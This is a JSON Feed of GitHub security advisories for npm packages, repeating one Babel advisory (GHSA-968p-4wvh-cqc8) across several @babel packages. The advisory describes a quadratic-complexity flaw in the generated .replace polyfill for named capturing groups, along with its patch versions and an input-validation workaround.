{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When using Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a>, Babel will generate a polyfill for the <code>.replace</code> method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to <code>.replace</code>).</p>\n<p>Your generated code is vulnerable if <em>all</em> the following conditions are true:</p>\n<ul>\n<li>You use Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a> or </li>\n<li>You use the <code>.replace</code> method on a regular expression that contains named capturing groups</li>\n<li><strong>Your code uses untrusted strings as the second argument of <code>.replace</code></strong></li>\n</ul>\n<p>If you are using <code>@babel/preset-env</code> with the <a href=\"https://babeljs.io/docs/options#targets\"><code>targets</code></a> option, the transform that injects the vulnerable code is automatically enabled if:</p>\n<ul>\n<li>you use <a href=\"https://github.com/tc39/proposal-duplicate-named-capturing-groups\"><em>duplicated</em> named capturing groups</a>, and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23</li>\n<li>you use any <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">named capturing groups</a>, and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10</li>\n</ul>\n<p>You can verify what transforms <code>@babel/preset-env</code> is using by enabling the <a href=\"https://babeljs.io/docs/babel-preset-env#debug\"><code>debug</code> option</a>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This problem has been fixed in <code>@babel/helpers</code> and <code>@babel/runtime</code> 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on <code>@babel/helpers</code>, and instead you depend on <code>@babel/core</code> (which itself depends on <code>@babel/helpers</code>). Upgrading to <code>@babel/core</code> 7.26.10 is not required, but it guarantees that you are on a new enough <code>@babel/helpers</code> version.</p>\n<p>Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you are passing user-provided strings as the second argument of <code>.replace</code> on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring <code>$&lt;</code> if it's then not followed by <code>&gt;</code> (possibly with other characters in between).</p>\n<h3 id=\"references\">References</h3>\n<p>This vulnerability was reported and fixed in <a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</a></li>\n<li><a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a></li>\n<li><a href=\"https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4\">https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/advisories/GHSA-968p-4wvh-cqc8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8",
            "title": "[@babel/runtime-corejs3] Babel has inefficient RexExp complexity in generated code with .replace when transpiling named capturing groups",
            "date_modified": "2025-03-12T05:58:36.000Z",
            "date_published": "2025-03-11T20:30:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When using Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a>, Babel will generate a polyfill for the <code>.replace</code> method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to <code>.replace</code>).</p>\n<p>Your generated code is vulnerable if <em>all</em> the following conditions are true:</p>\n<ul>\n<li>You use Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a> or </li>\n<li>You use the <code>.replace</code> method on a regular expression that contains named capturing groups</li>\n<li><strong>Your code uses untrusted strings as the second argument of <code>.replace</code></strong></li>\n</ul>\n<p>If you are using <code>@babel/preset-env</code> with the <a href=\"https://babeljs.io/docs/options#targets\"><code>targets</code></a> option, the transform that injects the vulnerable code is automatically enabled if:</p>\n<ul>\n<li>you use <a href=\"https://github.com/tc39/proposal-duplicate-named-capturing-groups\"><em>duplicated</em> named capturing groups</a>, and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23</li>\n<li>you use any <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">named capturing groups</a>, and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10</li>\n</ul>\n<p>You can verify what transforms <code>@babel/preset-env</code> is using by enabling the <a href=\"https://babeljs.io/docs/babel-preset-env#debug\"><code>debug</code> option</a>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This problem has been fixed in <code>@babel/helpers</code> and <code>@babel/runtime</code> 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on <code>@babel/helpers</code>, and instead you depend on <code>@babel/core</code> (which itself depends on <code>@babel/helpers</code>). Upgrading to <code>@babel/core</code> 7.26.10 is not required, but it guarantees that you are on a new enough <code>@babel/helpers</code> version.</p>\n<p>Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you are passing user-provided strings as the second argument of <code>.replace</code> on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring <code>$&lt;</code> if it's then not followed by <code>&gt;</code> (possibly with other characters in between).</p>\n<h3 id=\"references\">References</h3>\n<p>This vulnerability was reported and fixed in <a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</a></li>\n<li><a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a></li>\n<li><a href=\"https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4\">https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/advisories/GHSA-968p-4wvh-cqc8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8",
            "title": "[@babel/runtime-corejs2] Babel has inefficient RexExp complexity in generated code with .replace when transpiling named capturing groups",
            "date_modified": "2025-03-12T05:58:36.000Z",
            "date_published": "2025-03-11T20:30:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When using Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a>, Babel will generate a polyfill for the <code>.replace</code> method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to <code>.replace</code>).</p>\n<p>Your generated code is vulnerable if <em>all</em> the following conditions are true:</p>\n<ul>\n<li>You use Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a> or </li>\n<li>You use the <code>.replace</code> method on a regular expression that contains named capturing groups</li>\n<li><strong>Your code uses untrusted strings as the second argument of <code>.replace</code></strong></li>\n</ul>\n<p>If you are using <code>@babel/preset-env</code> with the <a href=\"https://babeljs.io/docs/options#targets\"><code>targets</code></a> option, the transform that injects the vulnerable code is automatically enabled if:</p>\n<ul>\n<li>you use <a href=\"https://github.com/tc39/proposal-duplicate-named-capturing-groups\"><em>duplicated</em> named capturing groups</a>, and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23</li>\n<li>you use any <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">named capturing groups</a>, and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10</li>\n</ul>\n<p>You can verify what transforms <code>@babel/preset-env</code> is using by enabling the <a href=\"https://babeljs.io/docs/babel-preset-env#debug\"><code>debug</code> option</a>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This problem has been fixed in <code>@babel/helpers</code> and <code>@babel/runtime</code> 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on <code>@babel/helpers</code>, and instead you depend on <code>@babel/core</code> (which itself depends on <code>@babel/helpers</code>). Upgrading to <code>@babel/core</code> 7.26.10 is not required, but it guarantees that you are on a new enough <code>@babel/helpers</code> version.</p>\n<p>Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you are passing user-provided strings as the second argument of <code>.replace</code> on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring <code>$&lt;</code> if it's then not followed by <code>&gt;</code> (possibly with other characters in between).</p>\n<h3 id=\"references\">References</h3>\n<p>This vulnerability was reported and fixed in <a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</a></li>\n<li><a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a></li>\n<li><a href=\"https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4\">https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/advisories/GHSA-968p-4wvh-cqc8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8",
            "title": "[@babel/runtime] Babel has inefficient RexExp complexity in generated code with .replace when transpiling named capturing groups",
            "date_modified": "2025-03-12T05:58:36.000Z",
            "date_published": "2025-03-11T20:30:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When using Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a>, Babel will generate a polyfill for the <code>.replace</code> method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to <code>.replace</code>).</p>\n<p>Your generated code is vulnerable if <em>all</em> the following conditions are true:</p>\n<ul>\n<li>You use Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a> or </li>\n<li>You use the <code>.replace</code> method on a regular expression that contains named capturing groups</li>\n<li><strong>Your code uses untrusted strings as the second argument of <code>.replace</code></strong></li>\n</ul>\n<p>If you are using <code>@babel/preset-env</code> with the <a href=\"https://babeljs.io/docs/options#targets\"><code>targets</code></a> option, the transform that injects the vulnerable code is automatically enabled if:</p>\n<ul>\n<li>you use <a href=\"https://github.com/tc39/proposal-duplicate-named-capturing-groups\"><em>duplicated</em> named capturing groups</a>, and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23</li>\n<li>you use any <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">named capturing groups</a>, and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10</li>\n</ul>\n<p>You can verify what transforms <code>@babel/preset-env</code> is using by enabling the <a href=\"https://babeljs.io/docs/babel-preset-env#debug\"><code>debug</code> option</a>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This problem has been fixed in <code>@babel/helpers</code> and <code>@babel/runtime</code> 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on <code>@babel/helpers</code>, and instead you depend on <code>@babel/core</code> (which itself depends on <code>@babel/helpers</code>). Upgrading to <code>@babel/core</code> 7.26.10 is not required, but it guarantees that you are on a new enough <code>@babel/helpers</code> version.</p>\n<p>Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you are passing user-provided strings as the second argument of <code>.replace</code> on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring <code>$&lt;</code> if it's then not followed by <code>&gt;</code> (possibly with other characters in between).</p>\n<h3 id=\"references\">References</h3>\n<p>This vulnerability was reported and fixed in <a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</a></li>\n<li><a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a></li>\n<li><a href=\"https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4\">https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/advisories/GHSA-968p-4wvh-cqc8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8",
            "title": "[@babel/helpers] Babel has inefficient RexExp complexity in generated code with .replace when transpiling named capturing groups",
            "date_modified": "2025-03-12T05:58:36.000Z",
            "date_published": "2025-03-11T20:30:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When using Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a>, Babel will generate a polyfill for the <code>.replace</code> method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to <code>.replace</code>).</p>\n<p>Your generated code is vulnerable if <em>all</em> the following conditions are true:</p>\n<ul>\n<li>You use Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a> or </li>\n<li>You use the <code>.replace</code> method on a regular expression that contains named capturing groups</li>\n<li><strong>Your code uses untrusted strings as the second argument of <code>.replace</code></strong></li>\n</ul>\n<p>If you are using <code>@babel/preset-env</code> with the <a href=\"https://babeljs.io/docs/options#targets\"><code>targets</code></a> option, the transform that injects the vulnerable code is automatically enabled if:</p>\n<ul>\n<li>you use <a href=\"https://github.com/tc39/proposal-duplicate-named-capturing-groups\"><em>duplicated</em> named capturing groups</a>, and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23</li>\n<li>you use any <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">named capturing groups</a>, and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10</li>\n</ul>\n<p>You can verify what transforms <code>@babel/preset-env</code> is using by enabling the <a href=\"https://babeljs.io/docs/babel-preset-env#debug\"><code>debug</code> option</a>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This problem has been fixed in <code>@babel/helpers</code> and <code>@babel/runtime</code> 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on <code>@babel/helpers</code>, and instead you depend on <code>@babel/core</code> (which itself depends on <code>@babel/helpers</code>). Upgrading to <code>@babel/core</code> 7.26.10 is not required, but it guarantees that you are on a new enough <code>@babel/helpers</code> version.</p>\n<p>Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you are passing user-provided strings as the second argument of <code>.replace</code> on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring <code>$&lt;</code> if it's then not followed by <code>&gt;</code> (possibly with other characters in between).</p>\n<h3 id=\"references\">References</h3>\n<p>This vulnerability was reported and fixed in <a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</a></li>\n<li><a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a></li>\n<li><a href=\"https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4\">https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/advisories/GHSA-968p-4wvh-cqc8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8",
            "title": "[@babel/runtime-corejs3] Babel has inefficient RexExp complexity in generated code with .replace when transpiling named capturing groups",
            "date_modified": "2025-03-12T05:58:36.000Z",
            "date_published": "2025-03-11T20:30:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When using Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a>, Babel will generate a polyfill for the <code>.replace</code> method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to <code>.replace</code>).</p>\n<p>Your generated code is vulnerable if <em>all</em> the following conditions are true:</p>\n<ul>\n<li>You use Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a> or </li>\n<li>You use the <code>.replace</code> method on a regular expression that contains named capturing groups</li>\n<li><strong>Your code uses untrusted strings as the second argument of <code>.replace</code></strong></li>\n</ul>\n<p>If you are using <code>@babel/preset-env</code> with the <a href=\"https://babeljs.io/docs/options#targets\"><code>targets</code></a> option, the transform that injects the vulnerable code is automatically enabled if:</p>\n<ul>\n<li>you use <a href=\"https://github.com/tc39/proposal-duplicate-named-capturing-groups\"><em>duplicated</em> named capturing groups</a>, and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23</li>\n<li>you use any <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">named capturing groups</a>, and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10</li>\n</ul>\n<p>You can verify what transforms <code>@babel/preset-env</code> is using by enabling the <a href=\"https://babeljs.io/docs/babel-preset-env#debug\"><code>debug</code> option</a>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This problem has been fixed in <code>@babel/helpers</code> and <code>@babel/runtime</code> 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on <code>@babel/helpers</code>, and instead you depend on <code>@babel/core</code> (which itself depends on <code>@babel/helpers</code>). Upgrading to <code>@babel/core</code> 7.26.10 is not required, but it guarantees that you are on a new enough <code>@babel/helpers</code> version.</p>\n<p>Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you are passing user-provided strings as the second argument of <code>.replace</code> on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring <code>$&lt;</code> if it's then not followed by <code>&gt;</code> (possibly with other characters in between).</p>\n<h3 id=\"references\">References</h3>\n<p>This vulnerability was reported and fixed in <a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</a></li>\n<li><a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a></li>\n<li><a href=\"https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4\">https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/advisories/GHSA-968p-4wvh-cqc8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8",
            "title": "[@babel/runtime-corejs2] Babel has inefficient RexExp complexity in generated code with .replace when transpiling named capturing groups",
            "date_modified": "2025-03-12T05:58:36.000Z",
            "date_published": "2025-03-11T20:30:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When using Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a>, Babel will generate a polyfill for the <code>.replace</code> method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to <code>.replace</code>).</p>\n<p>Your generated code is vulnerable if <em>all</em> the following conditions are true:</p>\n<ul>\n<li>You use Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a> or </li>\n<li>You use the <code>.replace</code> method on a regular expression that contains named capturing groups</li>\n<li><strong>Your code uses untrusted strings as the second argument of <code>.replace</code></strong></li>\n</ul>\n<p>If you are using <code>@babel/preset-env</code> with the <a href=\"https://babeljs.io/docs/options#targets\"><code>targets</code></a> option, the transform that injects the vulnerable code is automatically enabled if:</p>\n<ul>\n<li>you use <a href=\"https://github.com/tc39/proposal-duplicate-named-capturing-groups\"><em>duplicated</em> named capturing groups</a>, and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23</li>\n<li>you use any <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">named capturing groups</a>, and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10</li>\n</ul>\n<p>You can verify what transforms <code>@babel/preset-env</code> is using by enabling the <a href=\"https://babeljs.io/docs/babel-preset-env#debug\"><code>debug</code> option</a>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This problem has been fixed in <code>@babel/helpers</code> and <code>@babel/runtime</code> 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on <code>@babel/helpers</code>, and instead you depend on <code>@babel/core</code> (which itself depends on <code>@babel/helpers</code>). Upgrading to <code>@babel/core</code> 7.26.10 is not required, but it guarantees that you are on a new enough <code>@babel/helpers</code> version.</p>\n<p>Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you are passing user-provided strings as the second argument of <code>.replace</code> on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring <code>$&lt;</code> if it's then not followed by <code>&gt;</code> (possibly with other characters in between).</p>\n<h3 id=\"references\">References</h3>\n<p>This vulnerability was reported and fixed in <a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</a></li>\n<li><a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a></li>\n<li><a href=\"https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4\">https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/advisories/GHSA-968p-4wvh-cqc8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8",
            "title": "[@babel/runtime] Babel has inefficient RexExp complexity in generated code with .replace when transpiling named capturing groups",
            "date_modified": "2025-03-12T05:58:36.000Z",
            "date_published": "2025-03-11T20:30:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When using Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a>, Babel will generate a polyfill for the <code>.replace</code> method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to <code>.replace</code>).</p>\n<p>Your generated code is vulnerable if <em>all</em> the following conditions are true:</p>\n<ul>\n<li>You use Babel to compile <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">regular expression named capturing groups</a> or </li>\n<li>You use the <code>.replace</code> method on a regular expression that contains named capturing groups</li>\n<li><strong>Your code uses untrusted strings as the second argument of <code>.replace</code></strong></li>\n</ul>\n<p>If you are using <code>@babel/preset-env</code> with the <a href=\"https://babeljs.io/docs/options#targets\"><code>targets</code></a> option, the transform that injects the vulnerable code is automatically enabled if:</p>\n<ul>\n<li>you use <a href=\"https://github.com/tc39/proposal-duplicate-named-capturing-groups\"><em>duplicated</em> named capturing groups</a>, and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23</li>\n<li>you use any <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group\">named capturing groups</a>, and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10</li>\n</ul>\n<p>You can verify what transforms <code>@babel/preset-env</code> is using by enabling the <a href=\"https://babeljs.io/docs/babel-preset-env#debug\"><code>debug</code> option</a>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This problem has been fixed in <code>@babel/helpers</code> and <code>@babel/runtime</code> 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on <code>@babel/helpers</code>, and instead you depend on <code>@babel/core</code> (which itself depends on <code>@babel/helpers</code>). Upgrading to <code>@babel/core</code> 7.26.10 is not required, but it guarantees that you are on a new enough <code>@babel/helpers</code> version.</p>\n<p>Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you are passing user-provided strings as the second argument of <code>.replace</code> on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring <code>$&lt;</code> if it's then not followed by <code>&gt;</code> (possibly with other characters in between).</p>\n<h3 id=\"references\">References</h3>\n<p>This vulnerability was reported and fixed in <a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</a></li>\n<li><a href=\"https://github.com/babel/babel/pull/17173\">https://github.com/babel/babel/pull/17173</a></li>\n<li><a href=\"https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4\">https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-968p-4wvh-cqc8\">https://github.com/advisories/GHSA-968p-4wvh-cqc8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8",
            "title": "[@babel/helpers] Babel has inefficient RexExp complexity in generated code with .replace when transpiling named capturing groups",
            "date_modified": "2025-03-12T05:58:36.000Z",
            "date_published": "2025-03-11T20:30:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
            },
            "tags": [
                "severity"
            ]
        },
        {
